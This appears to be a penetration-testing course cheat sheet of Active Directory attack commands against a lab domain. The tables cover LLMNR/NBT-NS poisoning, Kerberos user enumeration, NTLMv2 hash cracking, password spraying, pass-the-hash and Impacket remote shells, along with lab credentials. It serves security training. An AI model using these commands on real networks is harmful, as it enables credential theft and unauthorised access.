## Active Directory Enumeration & Attacks

### Initial Enumeration of the Domain

| Command/Flag                                                  | Example                                                                                                         | Description                                                                                                    |
|---------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------|
| `wireshark`                                                   | `sudo -E wireshark`                                                                                             | Launches Wireshark with elevated privileges to capture network traffic.                                      |
| `tcpdump -i [interface]`                                      | `sudo tcpdump -i ens224`                                                                                          | Captures packets on the specified network interface.                                                         |
| `responder -I [interface] -A`                                 | `sudo responder -I ens224 -A`                                                                                    | Runs Responder in passive analysis mode to capture LLMNR, NBT-NS, and MDNS traffic.                           |
| `fping -asgq [CIDR]`                                          | `fping -asgq 172.16.5.0/23`                                                                                        | Performs an ICMP ping sweep over a subnet to identify live hosts.                                               |
| `nmap -v -A -iL [hostlist] -oN [output file]`                  | `sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum`                                         | Executes an aggressive Nmap scan on a list of hosts and saves the output.                                      |
| `nmap -A [target IP]`                                         | `nmap -A 172.16.5.100`                                                                                            | Scans a specific host aggressively to enumerate open ports and services.                                       |
| `git clone [repo URL]`                                        | `sudo git clone https://github.com/ropnop/kerbrute.git`                                                           | Clones the Kerbrute repository for Active Directory username enumeration.                                    |
| `make help`                                                  | `make help`                                                                                                     | Displays available compiling options for Kerbrute.                                                             |
| `sudo make all`                                              | `sudo make all`                                                                                                 | Compiles Kerbrute binaries for Linux, Windows, and Mac.                                                        |
| `ls [directory]`                                             | `ls dist/`                                                                                                      | Lists the compiled binaries in the specified directory.                                                        |
| `./[binary]`                                                 | `./kerbrute_linux_amd64`                                                                                          | Executes the Linux Kerbrute binary to test its functionality.                                                  |
| `echo $PATH`                                                 | `echo $PATH`                                                                                                    | Displays the current PATH environment variable.                                                                |
| `sudo mv [binary] /usr/local/bin/[newname]`                    | `sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute`                                                            | Moves the Kerbrute binary into a PATH directory for system-wide access.                                          |
| `kerbrute userenum -d [domain] --dc [DC IP] [wordlist] -o [outfile]` | `kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users`                            | Runs Kerbrute to enumerate valid AD usernames on the specified domain using a wordlist.                           |

---

### LLMNR/NBT-NS Poisoning – from Linux

| Command/Flag                                          | Example                                                                                         | Description                                                                                                     |
|-------------------------------------------------------|-------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------|
| `responder -h`                                        | `responder -h`                                                                                  | Displays the help message and available options for Responder.                                                  |
| `responder -I [interface]`                            | `sudo responder -I ens224`                                                                       | Starts Responder on the given interface using its default poisoning settings to capture name resolution requests.|
| `hashcat -m [hash mode] [hash] [wordlist]`              | `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt`                                  | Uses Hashcat in NTLMv2 mode (5600) to crack the captured NetNTLMv2 hash using the RockYou wordlist.              |

---

### LLMNR/NBT-NS Poisoning – from Windows

| Command/Flag                                                         | Example                                                                               | Description                                                                                                           |
|----------------------------------------------------------------------|---------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------|
| `Import-Module [PathToInveigh.ps1]`                                    | `Import-Module .\Inveigh.ps1`                                                          | Loads the Inveigh PowerShell module from the current directory.                                                     |
| `(Get-Command Invoke-Inveigh).Parameters`                              | `(Get-Command Invoke-Inveigh).Parameters`                                              | Displays all available parameters for the `Invoke-Inveigh` command.                                                   |
| `Invoke-Inveigh -LLMNR [Y/N] -NBNS [Y/N] -ConsoleOutput [Y/N] -FileOutput [Y/N]` | `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`                              | Starts Inveigh with LLMNR and NBNS spoofing enabled and outputs to both console and file.                             |
| `.\Inveigh.exe`                                                      | `PS C:\htb> .\Inveigh.exe`                                                             | Executes the compiled C# version of Inveigh on the Windows attack host, running with default settings.                |

--- 

### Enumerating the Password Policy – from Linux – Credentialed

| Command/Flag                                                        | Example                                                                                                                       | Description                                                                                             |
|---------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------|
| `crackmapexec smb [target IP] -u [username] -p [password] --pass-pol` | `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol`                                                            | Retrieves the domain password policy over SMB using valid domain credentials.                         |
| `rpcclient -U "" -N [target IP]`                                     | `rpcclient -U "" -N 172.16.5.5`                                                                                               | Initiates an SMB NULL session with the target domain controller.                                     |
| `querydominfo`                                                      | `rpcclient $> querydominfo`                                                                                                   | Queries general domain information (users, groups, domain state) via RPC.                             |
| `getdompwinfo`                                                      | `rpcclient $> getdompwinfo`                                                                                                   | Retrieves detailed domain password policy settings.                                                   |

#### Enumerating the Password Policy – from Linux – SMB NULL Sessions

| Command/Flag                                                        | Example                                                                                                                       | Description                                                                                             |
|---------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------|
| `enum4linux -P [target IP]`                                           | `enum4linux -P 172.16.5.5`                                                                                                    | Enumerates the password policy via SMB NULL session on a Windows host.                                  |
| `enum4linux-ng -P [target IP] -oA [output basename]`                  | `enum4linux-ng -P 172.16.5.5 -oA ilfreight`                                                                                   | Uses enum4linux-ng to enumerate password policy and export data (JSON/YAML).                           |
| `cat [output file]`                                                  | `cat ilfreight.json`                                                                                                          | Displays the contents of the generated JSON file containing password policy information.              |

#### Enumerating the Password Policy – from Windows

| Command/Flag                                                        | Example                                                                                                                       | Description                                                                                             |
|---------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------|
| `net use \\[DC]\ipc$ "" /u:""`                                       | `net use \\DC01\ipc$ "" /u:""`                                                                                                 | Establishes an SMB NULL session from a Windows host to test unauthenticated access.                   |
| `net use \\[DC]\ipc$ "" /u:[username]`                               | `net use \\DC01\ipc$ "" /u:guest`                                                                                              | Attempts an SMB connection using a specified (but disabled) account, demonstrating an error case.      |
| `net use \\[DC]\ipc$ [password] /u:[username]`                       | `net use \\DC01\ipc$ "password" /u:guest`                                                                                      | Attempts an SMB connection showing an error when the password is incorrect.                          |
| `ldapsearch -h [target IP] -x -b "[Base DN]" -s sub "*" \| grep -m 1 -B 10 [attribute]` | `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" \| grep -m 1 -B 10 pwdHistoryLength`                    | Uses ldapsearch to pull password policy attributes from the domain via an anonymous LDAP bind.         |
| `net accounts`                                                      | `net accounts`                                                                                                                | Retrieves local/domain password and account policy using the built-in net.exe command on Windows.      |
| `import-module [PathToPowerView.ps1]`                                 | `import-module .\PowerView.ps1`                                                                                                | Imports the PowerView module in PowerShell for further domain policy enumeration.                    |
| `Get-DomainPolicy`                                                  | `Get-DomainPolicy`                                                                                                            | Retrieves domain password and account policy settings using PowerView.                               |

---

#### Enumerating & Retrieving Valid Usernames

| Command/Flag                                                                                                                  | Example                                                                                                                                                                                      | Description                                                                                                                      |
|-------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------|
| `enum4linux -U [target IP] \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"`                                                  | `enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"`                                                                                                         | Enumerates valid domain users via SMB NULL sessions and extracts the usernames from the output.                                  |
| `rpcclient -U "" -N [target IP]` <br> *(then at the rpcclient prompt: `enumdomusers`)*                                           | <pre>rpcclient -U "" -N 172.16.5.5  
rpcclient $> enumdomusers</pre>                                                                                                  | Connects anonymously to the domain controller via rpcclient and lists all domain users.                                         |
| `crackmapexec smb [target IP] --users`                                                                                        | `crackmapexec smb 172.16.5.5 --users`                                                                                                                                                        | Enumerates domain users (and displays attributes like bad password count) over SMB using a NULL session.                         |
| `ldapsearch -h [target IP] -x -b "[Base DN]" -s sub "(&(objectclass=user))" \| grep sAMAccountName: \| cut -f2 -d" "`              | `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "`                                              | Retrieves the domain user list via an LDAP anonymous bind and filters for sAMAccountName values.                               |
| `./windapsearch.py --dc-ip [target IP] -u "" -U`                                                                               | `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`                                                                                                                                               | Uses windapsearch to perform an anonymous bind and enumerate all Active Directory users.                                     |
| `kerbrute userenum -d [domain] --dc [DC IP] [user list file]`                                                                  | `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`                                                                                                                    | Enumerates valid domain user accounts using Kerberos pre-authentication with a supplied wordlist.                              |
| `crackmapexec smb [target IP] -u [username] -p [password] --users`                                                              | `sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users`                                                                                                             | Enumerates domain users over SMB using valid domain credentials to help build a target user list for password spraying.         |


---

### Internal Password Spraying – from Linux

#### Password Spraying with rpcclient

| Command/Flag                                                                                          | Example                                                                                                                       | Description                                                                                         |
|-------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------|
| `for u in $(cat [user_list]); do rpcclient -U "$u%[password]" -c "getusername;quit" [target_IP]; done \| grep Authority` | `for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5; done \| grep Authority`      | Loops through a list of usernames attempting to authenticate with a common password, filtering successful logins. |

#### Password Spraying with Kerbrute

| Command/Flag                                                                                          | Example                                                                                                                       | Description                                                                                         |
|-------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------|
| `kerbrute passwordspray -d [domain] --dc [DC_IP] [user_list] [password]`                              | `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1`                                      | Performs a Kerberos-based password spray against a list of users using a single password.           |

#### Password Spraying with CrackMapExec

| Command/Flag                                                                                          | Example                                                                                                                       | Description                                                                                         |
|-------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------|
| `crackmapexec smb [target_IP] -u [user_list_file] -p [password] \| grep +`                            | `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +`                                                | Attempts SMB logins using a password spray and filters output to show only successful authentications. |
| `crackmapexec smb [target_IP] -u [username] -p [password]`                                            | `sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`                                                                 | Validates a single user/password pair against the target via SMB.                                   |

#### Local Administrator Password Reuse via NTLM Hash

| Command/Flag                                                                                          | Example                                                                                                                       | Description                                                                                         |
|-------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------|
| `crackmapexec smb --local-auth [CIDR] -u [username] -H [NTLM_hash] \| grep +`                         | `sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +`             | Performs a password reuse spray using an NTLM hash across multiple hosts with local admin accounts. |

---

### Internal Password Spraying – from Windows

#### Password Spraying with DomainPasswordSpray

| Command/Flag                                                             | Example                                                                                                                         | Description                                                                                                              |
|--------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------|
| `Import-Module [PathToDomainPasswordSpray.ps1]`                          | `Import-Module .\DomainPasswordSpray.ps1`                                                                                       | Imports the DomainPasswordSpray PowerShell script for use in the current session.                                       |
| `Invoke-DomainPasswordSpray -Password [password] -OutFile [file]`       | `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue`                           | Performs a password spray using the provided password and outputs successful logins to the specified file.              |

#### Password Spraying with Kerbrute – from Windows

| Command/Flag                                                             | Example                                                                                                                         | Description                                                                                                              |
|--------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------|
| `kerbrute passwordspray -d [domain] --dc [DC_IP] [user_list] [password]` | `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1`                                        | Performs a Kerberos-based password spray from Windows using a specified user list and password.                         |

---

### Credentialed Enumeration – from Linux

#### CrackMapExec

| Command/Flag                                                                                      | Example                                                                                               | Description                                                                                         |
|---------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------|
| `crackmapexec smb [target IP] -u [username] -p [password] --users`                                | `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users`                                          | Enumerates domain users and displays their attributes, including bad password counts.               |
| `crackmapexec smb [target IP] -u [username] -p [password] --groups`                               | `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups`                                         | Enumerates domain groups and shows member counts.                                                   |
| `crackmapexec smb [target IP] -u [username] -p [password] --loggedon-users`                       | `crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users`                               | Enumerates users currently logged into a specified host.                                             |
| `crackmapexec smb [target IP] -u [username] -p [password] --shares`                               | `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares`                                         | Lists available SMB shares and the user's access level to each.                                     |
| `crackmapexec smb [target IP] -u [username] -p [password] -M spider_plus --share '[ShareName]'`   | `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'`       | Crawls the specified share and records accessible files to JSON output.                              |

#### SMBMap

| Command/Flag                                                                                     | Example                                                                                               | Description                                                                                         |
|--------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------|
| `smbmap -u [username] -p [password] -d [domain] -H [target IP]`                                   | `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5`                                  | Checks access and lists SMB shares and associated permissions.                                       |
| `smbmap -u [username] -p [password] -d [domain] -H [target IP] -R '[share]' --dir-only`           | `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only`| Recursively lists directory structure for a specific share.                                          |

#### rpcclient

| Command/Flag                                              | Example                                  | Description                                                                                     |
|-----------------------------------------------------------|------------------------------------------|-------------------------------------------------------------------------------------------------|
| `rpcclient -U "" -N [target IP]`                          | `rpcclient -U "" -N 172.16.5.5`           | Connects anonymously to a target host via RPC (if null sessions are allowed).                  |
| `rpcclient $> enumdomusers`                               | `enumdomusers`                           | Lists domain users with associated Relative Identifiers (RIDs).                                 |
| `rpcclient $> queryuser [RID]`                            | `queryuser 0x457`                        | Displays detailed user account info for the provided RID.                                       |

#### Impacket Toolkit

| Command/Flag                                                     | Example                                                                  | Description                                                                                         |
|------------------------------------------------------------------|--------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------|
| `psexec.py [domain]/[user]:[password]@[target IP]`               | `psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125`         | Executes a remote shell on the host using SMB and RPC as SYSTEM.                                   |
| `wmiexec.py [domain]/[user]:[password]@[target IP]`             | `wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5`         | Executes commands remotely using WMI; more stealthy and logs fewer events.                         |

#### Windapsearch

| Command/Flag                                                                                     | Example                                                                                                         | Description                                                                                           |
|--------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------|
| `python3 windapsearch.py --dc-ip [target IP] -u [user] -p [password] --da`                       | `python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da`                   | Enumerates users in the Domain Admins group using LDAP.                                                |
| `python3 windapsearch.py --dc-ip [target IP] -u [user] -p [password] -PU`                        | `python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU`                    | Recursively enumerates privileged users from nested group membership using LDAP.                      |

#### BloodHound.py

| Command/Flag                                                                                                                  | Example                                                                                                           | Description                                                                                                       |
|-------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------|
| `bloodhound-python -u [user] -p [password] -ns [DC IP] -d [domain] -c all`                                                    | `bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all`                       | Runs all BloodHound collection methods and outputs enumeration data for import into BloodHound GUI.             |
| `zip -r [output].zip *.json`                                                                                                   | `zip -r ilfreight_bh.zip *.json`                                                                                  | Archives all JSON output files for uploading into BloodHound GUI.                                                 |

